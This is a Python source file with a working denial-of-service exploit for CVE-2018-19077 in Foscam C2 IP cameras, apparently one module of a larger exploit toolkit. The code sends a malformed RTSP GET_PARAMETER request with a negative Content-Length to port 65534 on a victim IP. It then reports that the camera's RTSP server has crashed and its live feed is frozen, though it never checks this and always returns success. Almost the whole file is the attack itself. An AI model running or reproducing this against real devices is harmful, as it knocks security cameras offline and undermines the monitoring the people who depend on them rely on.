import logging
import os
import requests
import re
import sys, socket
import subprocess
from subprocess import call

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green


def Foscam_C2_CVE_2018_19077(victim_ip):
    try:
        # perform dos and check if performed successfully
        exploit_result = denial_of_service(victim_ip)
        print(exploit_result)
        if exploit_result:
            print(G+'Foscam_C2_CVE_2018_19077 exploit successful! RTSP server crashed, live feed of camera is frozen.'+W)
            return 'Foscam_C2_CVE_2018_19077 exploit successful! RTSP server crashed, live feed of camera is frozen.'
        else:
            print(R+'Foscam_C2_CVE_2018_19077 exploit failed!'+W)
            return 'Foscam_C2_CVE_2018_19077 exploit failed!'
    except KeyboardInterrupt:
        print('\n' + 'Program exiting...')
        sys.exit()


def denial_of_service(victim_ip):
    message = '''GET_PARAMETER a RTSP/1.0\r
Content-Length: -44\r
CSeq: 1\r
\r
'''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((victim_ip, 65534))
    s.sendall(message.encode())
    s.close()
    return True
